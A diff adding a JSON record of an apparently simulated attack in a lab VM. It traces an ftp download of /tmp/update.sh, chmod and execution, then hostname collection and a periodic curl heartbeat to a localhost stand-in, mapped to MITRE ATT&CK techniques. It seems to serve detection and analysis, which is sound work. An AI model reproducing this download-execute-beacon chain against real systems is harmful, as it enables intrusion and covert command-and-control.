@@ -1,0 +1,148 @@
+{
+  "scenario": "Suspicious File Download Activity",
+  "host": "bunny-VirtualBox",
+  "user": "bunny",
+  "attack_chain": {
+    "stage_1_download": {
+      "process": {
+        "pid": 14401,
+        "ppid": 11818,
+        "name": "ftp",
+        "image": "/usr/bin/ftp",
+        "command_line": "ftp 127.0.0.1"
+      },
+      "result": {
+        "downloaded_file": "/tmp/update.sh"
+      }
+    },
+    "stage_2_permission_modification": {
+      "process": {
+        "pid": 14785,
+        "ppid": 11818,
+        "name": "chmod",
+        "image": "/usr/bin/chmod",
+        "command_line": "chmod +x /tmp/update.sh"
+      },
+      "result": {
+        "permissions": "-rwxr-xr-x"
+      }
+    },
+    "stage_3_execution": {
+      "process": {
+        "pid": 14811,
+        "ppid": 11818,
+        "name": "bash",
+        "image": "/usr/bin/bash",
+        "command_line": "/bin/bash /tmp/update.sh"
+      },
+      "spawned_processes": [
+        {
+          "pid": 14812,
+          "ppid": 14811,
+          "name": "hostname",
+          "image": "/usr/bin/hostname",
+          "command_line": "hostname"
+        },
+        {
+          "pid": 14813,
+          "ppid": 14811,
+          "name": "curl",
+          "image": "/usr/bin/curl",
+          "command_line": "curl -s http://127.0.0.1:8080/heartbeat?host=bunny-VirtualBox"
+        },
+        {
+          "pid": 14815,
+          "ppid": 14811,
+          "name": "sleep",
+          "image": "/usr/bin/sleep",
+          "command_line": "sleep 30"
+        }
+      ]
+    },
+    "stage_4_beaconing": {
+      "iteration_1": {
+        "hostname_pid": 14812,
+        "curl_pid": 14813,
+        "sleep_pid": 14815
+      },
+      "iteration_2": {
+        "hostname_pid": 14822,
+        "curl_pid": 14823,
+        "sleep_pid": 14825
+      }
+    }
+  },
+  "lineage": {
+    "root_shell": {
+      "pid": 11818,
+      "name": "bash",
+      "children": [
+        {
+          "pid": 14401,
+          "name": "ftp"
+        },
+        {
+          "pid": 14785,
+          "name": "chmod"
+        },
+        {
+          "pid": 14811,
+          "name": "bash",
+          "command_line": "/bin/bash /tmp/update.sh",
+          "children": [
+            {
+              "pid": 14812,
+              "name": "hostname"
+            },
+            {
+              "pid": 14813,
+              "name": "curl"
+            },
+            {
+              "pid": 14815,
+              "name": "sleep"
+            },
+            {
+              "pid": 14822,
+              "name": "hostname"
+            },
+            {
+              "pid": 14823,
+              "name": "curl"
+            },
+            {
+              "pid": 14825,
+              "name": "sleep"
+            }
+          ]
+        }
+      ]
+    }
+  },
+  "behavior_summary": [
+    "File downloaded from remote source",
+    "Downloaded file made executable",
+    "Payload executed from temporary location",
+    "Host information collected using hostname",
+    "Outbound heartbeat callback initiated",
+    "Periodic beaconing behavior observed"
+  ],
+  "attack_mapping": [
+    {
+      "technique": "T1105",
+      "name": "Ingress Tool Transfer"
+    },
+    {
+      "technique": "T1059",
+      "name": "Command and Scripting Interpreter"
+    },
+    {
+      "technique": "T1071",
+      "name": "Application Layer Protocol"
+    },
+    {
+      "technique": "T1082",
+      "name": "System Information Discovery"
+    }
+  ]
+}
